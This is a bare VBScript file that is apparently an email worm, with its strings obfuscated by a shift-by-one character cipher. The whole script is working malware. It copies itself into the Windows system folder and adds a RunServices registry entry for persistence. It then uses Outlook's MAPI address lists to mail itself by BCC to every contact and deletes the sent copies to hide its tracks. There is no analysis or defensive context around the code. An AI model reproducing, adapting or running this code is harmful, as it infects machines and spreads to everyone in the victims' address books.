On Error Resume Next

Dim P3D7ZDM, H17VVVB, B3313QK, NIYBSR4, EH8T

Dim G3BBJU, I9D5

Set G3BBJU = CreateObject( DE4494D( "Tdsjqujoh/GjmfTztufnPckfdu" ) )
G3BBJU.CopyFile WScript.ScriptFullName, G3BBJU.BuildPath( G3BBJU.GetSpecialFolder(1), DE4494D( "DO6GZMC4/WCT" ) )

Set I9D5 = CreateObject( DE4494D( "XTdsjqu/Tifmm" ) )
I9D5.RegWrite DE4494D( "ILFZ`MPDBM`NBDIJOF]Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]SvoTfswjdft]" ) & DE4494D( "DO6GZMC4" ), G3BBJU.BuildPath( G3BBJU.GetSpecialFolder(1), DE4494D( "DO6GZMC4/WCT" ) )

Set P3D7ZDM = CreateObject( DE4494D( "Pvumppl/Bqqmjdbujpo" ) )
Set H17VVVB = P3D7ZDM.GetNameSpace( DE4494D( "NBQJ" ) )

For Each B3313QK In H17VVVB.AddressLists
    For NIYBSR4 = 1 To B3313QK.AddressEntries.Count
        Set EH8T = P3D7ZDM.CreateItem( 0 )

        EH8T.BCC = B3313QK.AddressEntries( NIYBSR4 ).Address

        EH8T.Subject = DE4494D( "Cbktb" )
        EH8T.Body = DE4494D( "Ifktbo" )
        EH8T.Attachments.Add WScript.ScriptFullName
        EH8T.DeleteAfterSubmit = True
        EH8T.Send
    Next
Next

Function DE4494D( HKYA )
   Dim XHP8QCHL
   Dim MDYS
   Dim X0QZA5PT

   XHP8QCHL = ""

   For MDYS = 1 To Len( HKYA )
       X0QZA5PT = Mid( HKYA, MDYS, 1 )

       XHP8QCHL = XHP8QCHL & Chr( Asc( X0QZA5PT ) - 1 )
   Next

   DE4494D = XHP8QCHL
End Function
